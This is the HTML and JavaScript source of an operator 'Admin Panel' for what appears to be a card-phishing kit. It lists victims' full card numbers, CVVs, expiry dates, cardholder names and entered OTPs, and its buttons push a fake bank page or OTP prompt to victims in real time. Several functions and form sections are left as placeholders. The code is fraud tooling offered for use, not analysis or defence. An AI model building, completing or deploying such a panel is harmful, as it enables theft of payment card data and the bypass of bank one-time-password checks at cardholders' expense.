<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel</title>
  <style>
    /* Keep all your existing CSS styles */
    body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
    h1 { text-align: center; margin-bottom: 20px; }
    .container { max-width: 1200px; margin: 0 auto; }
    /* ... rest of your existing styles ... */
    .show-bankpage-btn {
      background: #8b5cf6;
      color: white;
      padding: 6px 10px;
      margin-left: 5px;
    }
    .show-bankpage-btn:hover { background: #7c3aed; }
    .show-bankpage-btn:disabled { background: #666; }
  </style>
  <!-- Add Socket.io client -->
  <script src="/socket.io/socket.io.js"></script>
</head>
<body>
  <div class="container">
    <h1>Admin Panel</h1>
    
    <div class="generate-link">
      <h2>Generate Payment Link</h2>
      <form id="generateLinkForm">
        <!-- Keep your existing form elements -->
      </form>
      <div id="paymentLinkContainer" class="payment-link">
        <!-- Keep your existing payment link display -->
      </div>
    </div>

    <h2>Transactions</h2>
    <table id="transactionsTable">
      <!-- Keep your existing table structure -->
    </table>
  </div>

  <script>
    const socket = io();
    let transactions = new Map();
    let adminToken = localStorage.getItem('adminToken');

    // Initialize Socket.io
    socket.on('showBankPage', () => loadTransactions());
    socket.on('hideBankPage', () => loadTransactions());

    // Generate Payment Link
    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const amount = document.getElementById('amount').value;
      const description = document.getElementById('description').value;
      
      try {
        const response = await fetch('/api/generatePaymentLink', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${adminToken}`
          },
          body: JSON.stringify({ amount, description })
        });
        
        const data = await response.json();
        if (data.status === 'success') {
          document.getElementById('paymentLink').textContent = data.paymentLink;
          document.getElementById('paymentLinkContainer').style.display = 'block';
        }
      } catch (error) {
        console.error('Error generating payment link:', error);
        alert('Failed to generate payment link');
      }
    });

    // Bank Page Functions
    async function showBankPage(id) {
      try {
        const response = await fetch("/api/showBankPage", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "Authorization": `Bearer ${adminToken}`
          },
          body: JSON.stringify({ invoiceId: id })
        });
        
        if (!response.ok) throw new Error('Failed to show bank page');
        
        // Open bank page in new tab
        window.open(`/bankpage.html?invoiceId=${id}`, '_blank');
        loadTransactions();
        
      } catch (error) {
        console.error('Error showing bank page:', error);
        alert('Failed to show bank page. Please try again.');
      }
    }

    async function hideBankPage(id) {
      try {
        const response = await fetch("/api/hideBankPage", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "Authorization": `Bearer ${adminToken}`
          },
          body: JSON.stringify({ invoiceId: id })
        });
        
        if (!response.ok) throw new Error('Failed to hide bank page');
        loadTransactions();
        
      } catch (error) {
        console.error('Error hiding bank page:', error);
        alert('Failed to hide bank page. Please try again.');
      }
    }

    // Transaction Loading
    async function loadTransactions() {
      try {
        const response = await fetch("/api/transactions", {
          headers: {
            "Authorization": `Bearer ${adminToken}`
          }
        });
        const data = await response.json();
        const tbody = document.querySelector("#transactionsTable tbody");
        tbody.innerHTML = '';
        
        data.forEach(tx => {
          const row = document.createElement('tr');
          row.innerHTML = `
            <td>${tx.id}</td>
            <td>${tx.email}</td>
            <td>${tx.amount}</td>
            <td>${tx.currency}</td>
            <td>${tx.cardNumber}</td>
            <td>${tx.cvv}</td>
            <td>${tx.expiry}</td>
            <td>${tx.cardholder}</td>
            <td>
              ${tx.otpEntered ? 
                `<span class="otp-received">${tx.otpEntered}</span>
                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
                   Incorrect OTP
                 </button>` : 
                tx.otpShown ?
                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
                  `<div style="display: flex; gap: 6px;">
                    <button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                      Show OTP
                    </button>
                    <button class="show-bankpage-btn" onclick="showBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                      Show Bank Page
                    </button>
                  </div>`
              }
            </td>
            <td>
              <span class="status-badge status-${tx.status || 'processing'}">
                ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
              </span>
            </td>
            <td>
              ${!tx.redirectStatus ? `
                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
                  Success
                </button>
                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>
                  Fail
                </button>
                ${tx.bankPageActive ? 
                  `<button class="wrong-otp-btn" onclick="hideBankPage('${tx.id}')">
                    Hide Bank Page
                  </button>` : ''}
              ` : ''}
            </td>
          `;
          tbody.appendChild(row);
        });
      } catch (error) {
        console.error('Error loading transactions:', error);
      }
    }

    // Initial load
    loadTransactions();
    setInterval(loadTransactions, 2000);

    // Add other existing functions (copyPaymentLink, showOTP, markWrongOTP, updateStatus) here
    // ... keep your existing functions unchanged ...

  </script>
</body>
</html>
